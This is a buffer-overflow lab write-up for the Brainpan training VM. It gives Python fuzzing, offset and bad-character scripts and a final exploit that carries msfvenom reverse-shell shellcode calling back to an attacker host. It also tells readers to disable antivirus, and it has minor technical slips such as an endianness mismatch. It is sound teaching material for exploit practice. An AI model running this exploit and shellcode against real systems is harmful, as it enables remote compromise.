# BufferOverflowGuide


## Hii..! Hackers Welcome 

### Brainpan is a vulnerable virtual machine designed for New students who are intrested to learn bufferoverflow or who are going to answer the oscp Examination. So in this github Page i will going show you how to exploit brainpan.exe. Well i will not going to start from the begnning like scanning the brainpan machine as i have already scaned the Machine and found Brainpan.exe in /bin path at port 10000 which was of python http server 



>***Requiments :- Immunity Debugger , VirtualBox in Windows7.***



### As i was facing some issue with my windows7 machine i use my host machine to exploit this brainpan.exe file 



>***Aim :- Exploiting BrainPan.exe and gaining Reverse Shell Access***



***NOTE :- Make sure that You Turn Off Your Anitvirus and Windows defender*** 

### Open Immunity Debugger in Administrator Mode and click on file >> open >> and select the brainpan.exe file! then click on the paly button so that the brainpan.exe is in running mode



![base1](https://user-images.githubusercontent.com/102399357/232192974-d27a2cdc-ba1c-469e-9147-792f0c30cdad.PNG)

### Then the .exe will start Running on the Host With Port Number 9999

![runnning](https://user-images.githubusercontent.com/102399357/232191959-ab9db141-5b4f-4e98-a922-214048c3bbd5.PNG)


### As we Now know that the .exe is serving on port 9999 now let us Fuzz the input of the brainpan.exe 

***What is Fuzzing ? <br />
In programming and software development, fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks. Typically, fuzzers are used to test programs that take structured inputs <br /> (Shameless copied from Wikipedia)*** 



## Step 1 Fuzzing <br />
### The Following Python Script is Used to Fuzz The brainpan.exe service <br />

```python
import socket
import sys
import time

IP="192.168.94.131"

i=100
while True:
	try:
		with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
			c.settimeout(5)
			c.connect((IP,9999))
			c.recv(9999999)
			string="A"*i
			c.send(bytes(string+" \r\n",'utf-8'))
			print("[+]"+str(i)+" Bytes Sent..!")
			time.sleep(1)
			c.recv(9999999)

	except:
		print("[!]Crashed at "+str(i)+" Bytes")
		sys.exit(0)
	i=i+100
```
**In The First Line of Code i have Imported some modules. I have declared some variables IP ( To set Ip Addr ) and i value to 100 for Counter purpose. Now in while True loop which is infinet loop i have added try and except block in which i have created a socket object refeared as c in which i set the timeout to 5 sec and then connect to the desire Ip address and Port Number of my Host machine. following that we recive the bufffer which is the banner and Enter Password Text after receving the buffer i have created the string variable in which i create "A" into 100 times at the first entry time and then we send the string with "\r\n" which is Used as a new line character in Windows And then we print how may bytes was send of "A" 's and then we recv the buffer saying that Access Denied in except block we print out that at how many bytes the program was crashed and then exit the program and if the the program was not crashed it incriments the i value t0 +100. and the program is continued until the .exe is being crashed...!**<br />


>***Python3 Fuzz.py***
<br />

![Fuzz](https://user-images.githubusercontent.com/102399357/232196177-caed504b-2f25-4b97-bda8-55a3b546e20b.PNG)

### As Soon as we run the script we see that the .exe Program gets Crashed at  600 bytes As We can see that the all the registors and EIP is Also gets overwritten with 41 which is "A" in hex format  <br />

![immuFuzz](https://user-images.githubusercontent.com/102399357/232196264-1670e72a-9ea2-4fdb-97ef-0f0dfb3109e3.PNG)

### Now we know that our .exe was crashing at 600 bytes but we actually dont know the Exact offset value.
<br />

## Step 2 Finding the Offset <br />

***what is offset? <br />
   When you are overflowing a buffer to write on the stack in a way which is exploitable you will overwrite the return address on the stack. Ie, sending a long string of AAAAAAAAAAAAAAAAAAAAAAAAAAA.....AAAAAAAAA will result in EIP containing the value 0x41414141 when the application crashes.***

**Now assume that if we pass "A" into 10 times + "B" into 4 times and in EIP we see that the EIP value is 42424242 so the offset will be 10bytes Because we see that after 10 "A"'s any value we provide to the string it gets overwritten to the EIP value**

### Now in real scenario we cannot guess the offset by hitting random value Again and Again this might be very time consuming for that we have a term called Cyclic Pattern generator in kali linux it comes with pre installed in metasploit. <br />


![cyclic](https://user-images.githubusercontent.com/102399357/232198783-84422f9f-f855-4aae-8158-9c24482c51e0.PNG)


**The script will generate a unique pattern of length 650 bytes, which is used for identifying the offset. The "-l" option is followed by the length of the pattern in bytes.Over hear i have specified 650 bytes because when we runed our Fuzzing Progarming we saw that the program got craashed at 600 bytes Right ? 
So the prgram offset can be below 600 bytes or equal to 600 bytes so it is alway a good habit to give more 50 or 100 bytes to be on safe side.** 

<br />

***Note :- If the "-l" option is not specified, the default pattern length of 8192 bytes is used.***

<br />

**Now Create a Python File named Offset.py**

```python
import socket
import sys
import time


cyclic_pattern="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av"


with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
	c.connect(("192.168.94.131",9999))
	c.recv(99999)
	c.send(bytes(cyclic_pattern+' \r\n',"utf-8"))
	print("[cyclic_pattern sucessfully sented]")
	c.close()

```
### The above python Script is used to find the offset of the EIP all the cretia is same but now insted of string we send the cyclic_pattern which was generated by the metasploit.

<br />

![cyclic_sent](https://user-images.githubusercontent.com/102399357/232201932-177c3508-df28-4168-b180-1b5f9d89c94b.PNG)

**In the above we see that the cyclic pattern as Sucessfully Sended.As soon as We sent the cyclic pattern it gets overwritten to EIP register so now we should copy th EIP value from the immunity Debugger.**

![imut_cyclic](https://user-images.githubusercontent.com/102399357/232202522-273177b5-403f-4766-b06a-34b2262fca47.png)
 
 **in my case the EIP value is 35724134 now in the he stack the value is stored in the Little edian Format which means that the value is in reverse order so if we remove the value in revrerse order and convert to hex the pattern in the EIP will be 4Ar5 i have Demostrate the by using python3 interpreter manually finding the cyclic paattern as it is a Good Pratice**
 
 <br />
 
 >***Use Python3***
 
 ![hex_decode](https://user-images.githubusercontent.com/102399357/232202850-6984866b-53d0-45ce-a13a-c2673448f2bf.PNG)

**After getting the exact value in EIP Pointer type the Following command in the kali linux.**

![match](https://user-images.githubusercontent.com/102399357/232202971-a81da0b2-3ec0-42db-8302-ff4236c6a1b1.png)

<br />

>***/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 4Ar5***

<br />

**In the above command the script will search for the pattern "4Ar5" within the input data and return the offset of the pattern if it is found.So in our Case the  Offset is Found To Be 524**


<br />

### Now we have found Our Offset which is 524 Now if We Write Anything more than 524 Bytes it will be overwrittend on EIP Register.

<br />


### Step 3 Overwriting EIP Registor.

**Now We know the offest value is 524 to just check we will write + 4 "B"'s and check if EIP value is 41414141. **

<br />

```python
import socket

offset=524

string="A"*offset+"BBBB"

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
	c.connect(("192.168.94.131",9999))
	c.recv(99999)
	c.send(bytes(string+' \r\n',"utf-8"))
	print("4 bytes overwritten on eip")
	c.close()
```

**Over her we are Genearting "A" till offset times and then adding B four times.**

<br  />

![4bytes](https://user-images.githubusercontent.com/102399357/232209406-1cd3b6ff-d348-4437-9d00-d9798ef2ba54.PNG)

<br />


![44444444444444444](https://user-images.githubusercontent.com/102399357/232209465-fda7d0fa-b358-4a3b-8b3e-8fd557fa52f6.PNG)


**if we see in immunity Debugger the EIP value is Set to Be 42424242 That is Amazing Now..!**




## Step 4 Finding The Bad Charaters.
***what are Bad Charaters?
Bad characters, in the context of exploit development and vulnerability testing, refer to specific bytes or characters that cannot be used in a payload or exploit code.These characters may cause issues such as crashing the application, corrupting the data, or interfering with the exploit's execution. Examples of bad characters include null bytes (0x00), carriage return (0x0d), and line feed (0x0a).***

<br />

**Now Create a Python File named Find_badChars.py**

<br />

```Python3
import socket

offset=524


badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

string="A"*offset+badchars

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
	c.connect(("192.168.94.131",9999))
	c.recv(99999)
	c.send(bytes(string+' \r\n',"utf-8"))
	print("Bad chars Send sucessfully..!")
	c.close()
```
### The above script will send the bad chars starting from the EIP registor now.

<br />

**Now if We Right click Over EDX Registor and cick on Follow in Dump and Scroll Down Until You See 01 02 ... till FF As i have Mentioned in the Below Video**

<br />

![gif_dump_Moment](https://user-images.githubusercontent.com/102399357/232206950-30839443-b3d2-470e-a91c-fd016f6a3d49.jpg)


**After the AAAAAA we see that 01 02 ..FF is begin Present.**

![bad_dump](https://user-images.githubusercontent.com/102399357/232206958-e31fd2a1-ea42-4f67-85cf-ed665eecb623.jpg)


**If Youll Want To use mona Modules then youll can go for it But in this exploit i will not go in depth of badchars as in brainpan.exe ther are no badchars except "\x00" which is an universal badchar**

## Step 5 Finding the Right Module.

>**If we Type !mona modules**

![eip_vuln_all_False](https://user-images.githubusercontent.com/102399357/232207719-dcbe0868-9373-4b63-9440-c975f59908ea.png)

<br />

### In the above we see that Brainpan.exe itsef it Vuln and all the Stack Protections are Being Set to False ALR which is Address space layout Randomization NEX Non executable stack ,SEH etc.

<br />

**Now we should find such module which jumps to esp whitout containg "\x00" char which is an Universal BAD Char**

<br />

>**Type !mona jmp -r esp -cbp "\x00"**

**This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).**

<br />

![vuln_address_eip](https://user-images.githubusercontent.com/102399357/232207955-8c600b80-e391-4001-9cce-2c3c64620c1d.png)

<br />

**We see that the only brainpan.exe itself is having it and over hear we need to know the stack base Address as we will need that Stack Base Address in the Furture**

<br />

## Step 6 Genrating The Shell Code

**Moving Furture We will Generate the Reverse TCP shellcode to bypass the firewall if it is Anabled Type the follwing Command To generate the shellCode**
<br  />

>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.94.10 LPORT=4444 EXITFUNC=thread -b "\x00" -a x86 -f python.

<br />

![msfpayloadcreationforshellcode](https://user-images.githubusercontent.com/102399357/232208498-91abee64-75a7-43e9-83e7-0e9295e154ed.PNG)

<br  />

**Let Me Explain what the Above Command is Doing 1st it will Create -p which denotes Payload follwed by windows reverse shell Now over hear we should put our Linux Ip adderss and Port Number As we will going to get reverse shell back from the victim. -b option stands for badchar in our case we found bad char as \x00 which is universal bad char follwed by -a which specifies arch of the system in my case it is x86 64 bit and finally generate my shell code in -f format  in python**

<br  />

## Step 7 Exploit

**This is the final stage of the Exploitation in which we will going to combine all the above codes and make one single python File named Exploit.py**
 <br />
 
 ```python
 import socket
import time
import sys
import struct

offset=524

junks=b"A"*offset

new_eip=struct.pack(">I",0x311712F3)

padding=b"\x90"*30

buf =  b""
buf += b"\xda\xc0\xb8\xb4\xa7\x21\xca\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x31\x47\x17\x83\xef\xfc\x03\xf3\xb4\xc3"
buf += b"\x3f\x07\x52\x81\xc0\xf7\xa3\xe6\x49\x12\x92\x26\x2d"
buf += b"\x57\x85\x96\x25\x35\x2a\x5c\x6b\xad\xb9\x10\xa4\xc2"
buf += b"\x0a\x9e\x92\xed\x8b\xb3\xe7\x6c\x08\xce\x3b\x4e\x31"
buf += b"\x01\x4e\x8f\x76\x7c\xa3\xdd\x2f\x0a\x16\xf1\x44\x46"
buf += b"\xab\x7a\x16\x46\xab\x9f\xef\x69\x9a\x0e\x7b\x30\x3c"
buf += b"\xb1\xa8\x48\x75\xa9\xad\x75\xcf\x42\x05\x01\xce\x82"
buf += b"\x57\xea\x7d\xeb\x57\x19\x7f\x2c\x5f\xc2\x0a\x44\xa3"
buf += b"\x7f\x0d\x93\xd9\x5b\x98\x07\x79\x2f\x3a\xe3\x7b\xfc"
buf += b"\xdd\x60\x77\x49\xa9\x2e\x94\x4c\x7e\x45\xa0\xc5\x81"
buf += b"\x89\x20\x9d\xa5\x0d\x68\x45\xc7\x14\xd4\x28\xf8\x46"
buf += b"\xb7\x95\x5c\x0d\x5a\xc1\xec\x4c\x33\x26\xdd\x6e\xc3"
buf += b"\x20\x56\x1d\xf1\xef\xcc\x89\xb9\x78\xcb\x4e\xbd\x52"
buf += b"\xab\xc0\x40\x5d\xcc\xc9\x86\x09\x9c\x61\x2e\x32\x77"
buf += b"\x71\xcf\xe7\xd8\x21\x7f\x58\x99\x91\x3f\x08\x71\xfb"
buf += b"\xcf\x77\x61\x04\x1a\x10\x08\xff\xcd\xdf\x65\xa1\x07"
buf += b"\x88\x77\x5d\x09\x14\xf1\xbb\x43\xb4\x57\x14\xfc\x2d"
buf += b"\xf2\xee\x9d\xb2\x28\x8b\x9e\x39\xdf\x6c\x50\xca\xaa"
buf += b"\x7e\x05\x3a\xe1\xdc\x80\x45\xdf\x48\x4e\xd7\x84\x88"
buf += b"\x19\xc4\x12\xdf\x4e\x3a\x6b\xb5\x62\x65\xc5\xab\x7e"
buf += b"\xf3\x2e\x6f\xa5\xc0\xb1\x6e\x28\x7c\x96\x60\xf4\x7d"
buf += b"\x92\xd4\xa8\x2b\x4c\x82\x0e\x82\x3e\x7c\xd9\x79\xe9"
buf += b"\xe8\x9c\xb1\x2a\x6e\xa1\x9f\xdc\x8e\x10\x76\x99\xb1"
buf += b"\x9d\x1e\x2d\xca\xc3\xbe\xd2\x01\x40\xde\x30\x83\xbd"
buf += b"\x77\xed\x46\x7c\x1a\x0e\xbd\x43\x23\x8d\x37\x3c\xd0"
buf += b"\x8d\x32\x39\x9c\x09\xaf\x33\x8d\xff\xcf\xe0\xae\xd5"

payload=junks+new_eip+padding+buf+b" \r\n"

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
	c.connect(("192.168.94.131",9999))
	c.recv(99999)
	c.send(payload)
	print("[!]Malicious Buffer Send Sucessfully ;-)")
	c.close()
 ```
 
<br />

**in the above code i have imported some required modules furture i have created varibles named offset which is set to 524 junk var which is set to A into offest new_eip inwhich i have packed the Base address of the stack which we have found in Step 5 in Little Edian Format after that i have set paddig which are also knonw as nops means Do nothing which i is represteted in \x90 format i have generated padding into 30 times pagging will created some distance from EIP till ShellCode so that the it do not affect the program execution but serve to pad the payload and provide extra space for the exploit code to be inserted. The NOPs can be used to ensure that the exploit code is executed properly and that it starts at a specific memory address. After all the stuff make sure you Activated the Listiner On Your Linux Machine.**


<br />


![listing](https://user-images.githubusercontent.com/102399357/232210023-9f612619-e23b-4ad1-a925-06ce82006227.PNG)

<br />

**After Activating Listiner on the desire Port Number which is 4444 Run the Python Script.**

<br />

>python3 Exploit.py.

<br />


![maliciousBuffsentsucess](https://user-images.githubusercontent.com/102399357/232210168-c94aa118-4e78-4332-8ea1-6682f16dedf2.PNG)

<br />


**We Can see That our Payload has Been Sucessfully Sended..! Now if we see our Listiner Shell BOOMMMMMMM AND WE GOT THE SHELL FINALLY.**

<br />

![reverseshell](https://user-images.githubusercontent.com/102399357/232210233-5cb42151-475a-4623-aae1-ec36e27b1b92.PNG)

<br />


## And thats How i Exploted My First Buffer Overflow 

